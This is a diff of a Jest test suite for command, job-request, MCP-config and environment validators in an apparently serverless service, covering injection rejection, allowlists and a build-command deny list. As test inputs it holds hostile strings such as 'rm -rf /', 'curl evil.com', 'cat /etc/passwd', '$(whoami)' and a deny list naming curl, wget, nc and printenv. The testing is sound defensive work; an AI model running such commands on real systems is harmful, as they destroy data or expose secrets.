@@ -6,7 +6,7 @@
 
 // The lambda dir is excluded from tsconfig, so we import the source directly
 // and rely on ts-jest to compile it.
-import { validateCommand, validateJobRequest, getEnvOrThrow, jsonResponse, errorResponse } from '../lambda/utils/index';
+import { validateCommand, validateJobRequest, validateMcpConfig, validateEnvironment, getEnvOrThrow, jsonResponse, errorResponse } from '../lambda/utils/index';
 
 // ─── Command Injection Prevention ────────────────────────────────────
 
@@ -20,53 +20,56 @@ describe('validateCommand — injection prevention', () => {
 
   test('rejects shell metacharacters in otherwise valid commands', () => {
     const injections = [
-      'atx transform ; rm -rf /',
-      'atx transform && curl evil.com',
-      'atx transform || true',
-      'atx transform | cat /etc/passwd',
-      'atx transform `whoami`',
-      'atx transform $(id)',
-      'atx transform ${HOME}',
-      'atx transform\nrm -rf /',
-      'atx transform\rrm -rf /',
-      'atx transform > /tmp/out',
-      'atx transform < /etc/passwd',
-      'atx transform >> /tmp/out',
-      'atx transform << EOF',
+      'atx custom def exec `whoami`',
+      'atx custom def exec $(id)',
+      'atx custom def exec ${HOME}',
+      'atx custom def exec\nrm -rf /',
+      'atx custom def exec\rrm -rf /',
     ];
     for (const cmd of injections) {
-      expect(() => validateCommand(cmd)).toThrow(/dangerous pattern/i);
+      expect(() => validateCommand(cmd)).toThrow();
     }
   });
 
-  test('rejects curly braces (bash expansion)', () => {
-    expect(() => validateCommand('atx transform {a,b}')).toThrow(/dangerous pattern/i);
+  test('allows shell operators that are valid in build commands', () => {
+    expect(() => validateCommand('atx custom def exec -n td -c "mvn clean test" -x -t')).not.toThrow();
+  });
+
+  test('rejects command substitution via curly braces', () => {
+    expect(() => validateCommand('atx custom def exec ${HOME}')).toThrow(/dangerous pattern/i);
   });
 
   test('rejects characters outside the safe charset', () => {
-    expect(() => validateCommand('atx transform --td "test" \x00')).toThrow(/invalid characters/i);
-    expect(() => validateCommand('atx transform --td "test" \x1b[31m')).toThrow();
-    expect(() => validateCommand('atx transform --td "tëst"')).toThrow(/invalid characters/i);
+    expect(() => validateCommand('atx custom def exec -n "test" \x00')).toThrow(/invalid characters/i);
+    expect(() => validateCommand('atx custom def exec -n "test" \x1b[31m')).toThrow();
+    expect(() => validateCommand('atx custom def exec -n "tëst"')).toThrow(/invalid characters/i);
   });
 
   test('accepts valid atx commands', () => {
-    expect(() => validateCommand('atx transform --td my-td')).not.toThrow();
-    expect(() => validateCommand('atx transform --td my-td --source s3://bucket/key')).not.toThrow();
-    expect(() => validateCommand("atx transform --td 'my td name'")).not.toThrow();
-    expect(() => validateCommand('atx transform --td my-td --output path/to/output')).not.toThrow();
-    expect(() => validateCommand('atx transform --td my_td --config key=value')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n my-td -p /source/repo -x -t')).not.toThrow();
+    expect(() => validateCommand('atx custom def list --json')).not.toThrow();
+    expect(() => validateCommand('atx custom def get -n my-td')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n my-td --configuration key=value')).not.toThrow();
   });
 
   test('accepts commands with allowed special characters', () => {
-    // These are in the SAFE_CHARS regex
-    expect(() => validateCommand('atx transform --td my-td:v1')).not.toThrow();
-    expect(() => validateCommand('atx transform --td my-td --tags "key=value,k2=v2"')).not.toThrow();
-    expect(() => validateCommand('atx transform --td my-td --source git@github.com:org/repo')).not.toThrow();
-    expect(() => validateCommand('atx transform --td my-td --env ["a","b"]')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n my-td:v1 -p /source/repo')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n my-td --tags "key=value,k2=v2"')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n my-td --source git@github.com:org/repo')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n my-td --env ["a","b"]')).not.toThrow();
   });
 
   test('trims whitespace before validation', () => {
-    expect(() => validateCommand('  atx transform --td my-td  ')).not.toThrow();
+    expect(() => validateCommand('  atx custom def exec -n my-td  ')).not.toThrow();
+  });
+
+  test('rejects disallowed atx subcommands', () => {
+    expect(() => validateCommand('atx mcp tools')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx update')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx --resume')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def delete -n my-td')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def publish -n my-td')).toThrow(/not allowed/i);
   });
 
 });
@@ -94,29 +97,29 @@ describe('validateJobRequest — input sanitization', () => {
   });
 
   test('rejects unsupported source URL schemes', () => {
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: 'file:///etc/passwd' }))
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: 'file:///etc/passwd' }))
       .toContain('Invalid source format');
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: 'ftp://server/file' }))
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: 'ftp://server/file' }))
       .toContain('Invalid source format');
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: 'javascript:alert(1)' }))
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: 'javascript:alert(1)' }))
       .toContain('Invalid source format');
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: '/local/path' }))
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: '/local/path' }))
       .toContain('Invalid source format');
   });
 
   test('accepts valid source URL schemes', () => {
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: 's3://bucket/key' })).toBeNull();
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: 'https://github.com/org/repo' })).toBeNull();
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: 'ssh://git@github.com/org/repo' })).toBeNull();
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t', source: 'git@github.com:org/repo.git' })).toBeNull();
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: 's3://bucket/key' })).toBeNull();
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: 'https://github.com/org/repo' })).toBeNull();
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: 'ssh://git@github.com/org/repo' })).toBeNull();
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t', source: 'git@github.com:org/repo.git' })).toBeNull();
   });
 
   test('accepts valid request with no source', () => {
-    expect(validateJobRequest({ jobName: 'test', command: 'atx transform --td t' })).toBeNull();
+    expect(validateJobRequest({ jobName: 'test', command: 'atx custom def exec -n t' })).toBeNull();
   });
 
   test('accepts jobName at exactly 128 characters', () => {
-    expect(validateJobRequest({ jobName: 'a'.repeat(128), command: 'atx transform --td t' })).toBeNull();
+    expect(validateJobRequest({ jobName: 'a'.repeat(128), command: 'atx custom def exec -n t' })).toBeNull();
   });
 });
 
@@ -164,5 +167,146 @@ describe('utility functions', () => {
     const resp = errorResponse(400, 'bad request');
     expect(resp.statusCode).toBe(400);
     expect(resp.error).toBe('bad request');
+  });
+});
+
+// ─── MCP Config Validation ───────────────────────────────────────────
+
+describe('validateMcpConfig — MCP server command allowlist', () => {
+  test('accepts valid MCP configs with allowed commands', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'npx', args: ['-y', '@company/server'] } } })).toBeNull();
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'uvx', args: ['my-server@latest'] } } })).toBeNull();
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'node', args: ['server.js'] } } })).toBeNull();
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'python', args: ['-m', 'my_server'] } } })).toBeNull();
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'python3', args: ['-m', 'my_server'] } } })).toBeNull();
+  });
+
+  test('accepts config with multiple valid servers', () => {
+    expect(validateMcpConfig({
+      mcpServers: {
+        docs: { command: 'uvx', args: ['awslabs.aws-documentation-mcp-server@latest'] },
+        custom: { command: 'npx', args: ['-y', '@org/mcp-server'] },
+      },
+    })).toBeNull();
+  });
+
+  test('rejects shell interpreters', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'bash', args: ['-c', 'curl evil.com'] } } })).toContain('not allowed');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'sh', args: ['-c', 'id'] } } })).toContain('not allowed');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'zsh' } } })).toContain('not allowed');
+  });
+
+  test('rejects commands with path separators', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: { command: '/usr/bin/curl' } } })).toContain('must not contain paths');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: './malicious' } } })).toContain('must not contain paths');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: '../escape' } } })).toContain('must not contain paths');
+  });
+
+  test('rejects arbitrary executables', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'curl' } } })).toContain('not allowed');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'wget' } } })).toContain('not allowed');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'nc' } } })).toContain('not allowed');
+  });
+
+  test('rejects missing or invalid command field', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: {} } })).toContain('missing or invalid command');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 123 } } })).toContain('missing or invalid command');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: '' } } })).toContain('missing or invalid command');
+  });
+
+  test('rejects missing mcpServers key', () => {
+    expect(validateMcpConfig({})).toContain('must contain mcpServers');
+    expect(validateMcpConfig({ servers: {} })).toContain('must contain mcpServers');
+  });
+
+  test('rejects non-object server entries', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: 'not-an-object' } })).toContain('must be an object');
+    expect(validateMcpConfig({ mcpServers: { s1: null } })).toContain('must be an object');
+  });
+});
+
+// ─── Environment Variable Value Validation ───────────────────────────
+
+describe('validateEnvironment — version value validation', () => {
+  test('accepts valid Java versions', () => {
+    for (const v of ['8', '11', '17', '21', '25']) {
+      expect(validateEnvironment({ JAVA_VERSION: v })).toBeNull();
+    }
+  });
+
+  test('accepts valid Python versions (short and dotted)', () => {
+    for (const v of ['8', '9', '10', '11', '12', '13', '14', '3.8', '3.9', '3.10', '3.11', '3.12', '3.13', '3.14']) {
+      expect(validateEnvironment({ PYTHON_VERSION: v })).toBeNull();
+    }
+  });
+
+  test('accepts valid Node versions', () => {
+    for (const v of ['16', '18', '20', '22', '24']) {
+      expect(validateEnvironment({ NODE_VERSION: v })).toBeNull();
+    }
+  });
+
+  test('rejects arbitrary strings', () => {
+    expect(validateEnvironment({ JAVA_VERSION: '$(whoami)' })).toContain('Invalid JAVA_VERSION');
+    expect(validateEnvironment({ PYTHON_VERSION: 'latest' })).toContain('Invalid PYTHON_VERSION');
+    expect(validateEnvironment({ NODE_VERSION: '`id`' })).toContain('Invalid NODE_VERSION');
+  });
+
+  test('rejects unsupported version formats', () => {
+    expect(validateEnvironment({ JAVA_VERSION: '23a' })).toContain('Invalid JAVA_VERSION');
+    expect(validateEnvironment({ PYTHON_VERSION: 'three' })).toContain('Invalid PYTHON_VERSION');
+    expect(validateEnvironment({ NODE_VERSION: '20.1' })).toContain('Invalid NODE_VERSION');
+  });
+
+  test('ignores unknown keys', () => {
+    expect(validateEnvironment({ UNKNOWN_KEY: 'anything' })).toBeNull();
+  });
+
+  test('validates multiple keys', () => {
+    expect(validateEnvironment({ JAVA_VERSION: '21', NODE_VERSION: '20' })).toBeNull();
+    expect(validateEnvironment({ JAVA_VERSION: '21', NODE_VERSION: 'evil' })).toContain('Invalid NODE_VERSION');
+  });
+});
+
+// ─── Build Command Deny List ─────────────────────────────────────────
+
+describe('validateCommand — build command deny list', () => {
+  test('accepts valid build commands via -c', () => {
+    expect(() => validateCommand('atx custom def exec -n td -p /source/repo -c mvn -x -t')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n td -c gradle -x -t')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n td -c npm -x -t')).not.toThrow();
+    expect(() => validateCommand('atx custom def exec -n td --build-command make -x -t')).not.toThrow();
+  });
+
+  test('rejects denied commands via -c', () => {
+    expect(() => validateCommand('atx custom def exec -n td -c curl -x -t')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def exec -n td -c wget -x -t')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def exec -n td -c whoami -x -t')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def exec -n td -c nc -x -t')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def exec -n td -c base64 -x -t')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def exec -n td -c printenv -x -t')).toThrow(/not allowed/i);
+  });
+
+  test('rejects denied commands even when quoted', () => {
+    expect(() => validateCommand("atx custom def exec -n td -c 'curl' -x -t")).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def exec -n td -c "wget" -x -t')).toThrow(/not allowed/i);
+  });
+
+  test('rejects denied commands via --build-command', () => {
+    expect(() => validateCommand('atx custom def exec -n td --build-command curl -x -t')).toThrow(/not allowed/i);
+    expect(() => validateCommand('atx custom def exec -n td --build-command wget -x -t')).toThrow(/not allowed/i);
+  });
+
+  test('rejects denied commands via --configuration buildCommand=', () => {
+    expect(() => validateCommand("atx custom def exec -n td --configuration buildcommand=curl -x -t")).toThrow(/not allowed/i);
+    expect(() => validateCommand("atx custom def exec -n td --configuration buildcommand=whoami -x -t")).toThrow(/not allowed/i);
+  });
+
+  test('accepts valid build commands via --configuration buildCommand=', () => {
+    expect(() => validateCommand("atx custom def exec -n td --configuration buildcommand=mvn -x -t")).not.toThrow();
+  });
+
+  test('allows commands without -c flag', () => {
+    expect(() => validateCommand('atx custom def exec -n td -p /source/repo -x -t')).not.toThrow();
   });
 });
